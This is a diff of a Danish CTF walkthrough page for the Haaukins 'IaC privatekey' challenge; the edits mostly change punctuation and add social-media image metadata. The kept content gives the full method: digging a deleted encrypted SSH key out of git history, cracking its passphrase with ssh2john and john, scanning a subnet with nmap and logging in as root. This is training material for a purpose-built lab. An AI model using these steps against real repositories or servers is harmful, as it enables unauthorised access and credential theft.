@@ -3,14 +3,18 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Haaukins: IaC privatekey in history — tutorial (git-secrets)</title>
+<title>Haaukins: IaC privatekey in history, tutorial (git-secrets)</title>
 <meta name="description" content="Guide til Haaukins IaC privatekey: hent en &#x27;slettet&#x27; krypteret SSH-nøgle ud af git-historikken, knæk passphrasen med ssh2john, og brug nøglen til at nå root.">
 <link rel="canonical" href="https://lolcatatonia.github.io/haaukins-walkthroughs/iac-privatekey.html">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Haaukins: IaC privatekey in history — tutorial (git-secrets)">
+<meta property="og:title" content="Haaukins: IaC privatekey in history, tutorial (git-secrets)">
 <meta property="og:description" content="Guide til Haaukins IaC privatekey: hent en &#x27;slettet&#x27; krypteret SSH-nøgle ud af git-historikken, knæk passphrasen med ssh2john, og brug nøglen til at nå root.">
 <meta property="og:url" content="https://lolcatatonia.github.io/haaukins-walkthroughs/iac-privatekey.html">
-<meta name="twitter:card" content="summary">
+<meta property="og:image" content="https://lolcatatonia.github.io/haaukins-walkthroughs/assets/og-default.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://lolcatatonia.github.io/haaukins-walkthroughs/assets/og-default.png">
 <script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "IaC privatekey (in history)", "description": "Guide til Haaukins IaC privatekey: hent en 'slettet' krypteret SSH-nøgle ud af git-historikken, knæk passphrasen med ssh2john, og brug nøglen til at nå root.", "url": "https://lolcatatonia.github.io/haaukins-walkthroughs/iac-privatekey.html", "inLanguage": "da", "about": {"@type": "Thing", "name": "Haaukins CTF"}}</script>
 <link rel="stylesheet" href="assets/style.css">
 <script src="assets/gloss.js" defer></script>
@@ -23,7 +27,7 @@
 <p class="subtitle">Hent en 'slettet' nøgle ud af git-historikken og knæk den.</p>
 <div class="badges"><span class="badge cat">Forensics</span><span class="badge">Haaukins CTF</span></div>
 <div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
-<div class="callout">📚 <strong>Baggrund:</strong> denne opgave bygger på en fælles teknik — læs primeren: <a href="kom-i-gang.html">Kom i gang: VPN, Hosts og lab-opsætning</a>.</div>
+<div class="callout">📚 <strong>Baggrund:</strong> denne opgave bygger på en fælles teknik. Læs primeren: <a href="kom-i-gang.html">Kom i gang: VPN, Hosts og lab-opsætning</a>.</div>
 <h2>SSH ind og læs historikken</h2>
 <pre><code><span class="gloss" tabindex="0" data-tip="Leverer et SSH-password ikke-interaktivt, til brug i scripts.">sshpass</span> -p haaukins ssh haaukins@securevpn.hkn   # bruger/password givet i opgaveteksten
 cd ~/infrastructure &amp;&amp; git log --oneline --all</code></pre>
@@ -31,7 +35,7 @@ cd ~/infrastructure &amp;&amp; git log --oneline --all</code></pre>
              fortæller selv historien, ingen grund til at gætte:</p>
              <pre><code># "Just realized that API should not be added to files in version control"
 # "Privatekeys shouldn't be in version controls as well"
-# "...this key is more secure [but] can easily be broken using <span class="gloss" tabindex="0" data-tip="John the Ripper — password-cracker (CPU-baseret, mange hash-formater).">john</span> the ripper with the rockyou wordlist"</code></pre>
+# "...this key is more secure [but] can easily be broken using <span class="gloss" tabindex="0" data-tip="John the Ripper: password-cracker (CPU-baseret, mange hash-formater).">john</span> the ripper with the rockyou wordlist"</code></pre>
              <p>Den sidste besked er et gratis wordlist-hint, før vi overhovedet har set nøglen.</p>
 <h2>Hent de &#x27;slettede&#x27; nøgler ud af historikken</h2>
 <p>En fil fjernet i en senere commit er stadig et git-objekt. Gennemsøg ALLE blobs for
@@ -39,16 +43,16 @@ cd ~/infrastructure &amp;&amp; git log --oneline --all</code></pre>
              <pre><code>git rev-list --all --objects | awk '{print $1}' | while read o; do \
   [ "$(git cat-file -t $o)" = blob ] &amp;&amp; git cat-file -p $o 2>/dev/null | grep -q 'PRIVATE KEY' &amp;&amp; echo $o; done</code></pre>
              <p>To blobs: én ukrypteret OpenSSH-nøgle (i <code>wg-1.tf</code>s historik) og én krypteret
-             RSA-nøgle, AES-256-CBC (i <code>wg-2.tf</code>s historik) — det er DEN commit-beskeden om
+             RSA-nøgle, AES-256-CBC (i <code>wg-2.tf</code>s historik): det er DEN commit-beskeden om
              rockyou pegede på, og det er den opgavetitlens "<strong>protected</strong>" refererer til.</p>
              <pre><code>git cat-file -p &lt;wg2-blob&gt; | sed -n '/BEGIN RSA/,/END RSA/p' > wg2_enc.key
 <span class="gloss" tabindex="0" data-tip="Konverterer en krypteret SSH-nøgle til et format John kan angribe.">ssh2john</span> wg2_enc.key > wg2.john &amp;&amp; john --wordlist=rockyou.txt wg2.john   # -> sexygirl1
 ssh-keygen -p -P sexygirl1 -N '' -f wg2_dec.key</code></pre>
 <h2>Nøglen hører ikke til DENNE maskine</h2>
 <p>Prøver man den dekrypterede nøgle direkte mod <code>securevpn.hkn</code>, bliver den
-             afvist. Nøglen er til en AF DE TO DROPLETS Terraform-koden selv opretter (wg-1/wg-2) —
+             afvist. Nøglen er til en AF DE TO DROPLETS Terraform-koden selv opretter (wg-1/wg-2),
              maskiner der er på samme VPN-undernet, men ikke i DNS. Scan undernettet for at finde dem:</p>
-             <pre><code><span class="gloss" tabindex="0" data-tip="Netværksscanner — finder åbne porte og services på en host.">nmap</span> -Pn -p22 --open 34.25.151.0/24 -oG -      # -> .100 (wg-1) og .110 (wg-2)
+             <pre><code><span class="gloss" tabindex="0" data-tip="Netværksscanner: finder åbne porte og services på en host.">nmap</span> -Pn -p22 --open 34.25.151.0/24 -oG -      # -> .100 (wg-1) og .110 (wg-2)
 ssh -i wg2_dec.key -o PubkeyAcceptedKeyTypes=+ssh-rsa root@34.25.151.110 'cat /root/flag.txt'</code></pre>
              <p>Nyere OpenSSH afviser ssh-rsa som standard, deraf <code>PubkeyAcceptedKeyTypes</code>.</p>
              <p><strong>Decoy:</strong> den ukrypterede wg-1-nøgle giver OGSÅ root på <code>.100</code>, med
@@ -69,7 +73,7 @@ git-historikken for den slags. Når du får adgang til et repo, så gennemsøg h
 den nuværende tilstand, og læs commit-beskederne, de peger tit på hvad der skete.</p>
 <footer>
 Del af <a href="index.html">Haaukins CTF-tutorials</a>. <a href="https://www.haaukins.dk/" target="_blank">Haaukins</a>
-er en dansk undervisningsplatform til sikkerhedstræning (AAU / De Danske Cybermesterskaber) — alle opgaver
+er en dansk undervisningsplatform til sikkerhedstræning (AAU, De Danske Cybermesterskaber). Alle opgaver
 løses på platformens egne, formålsbyggede lab-miljøer, aldrig på andres systemer. Guiden forudsætter du selv
 har autoriseret adgang (fx som studerende eller deltager) og er løsningsstøtte til at lære metoden, ikke en
 genvej uden om selv at forstå den.
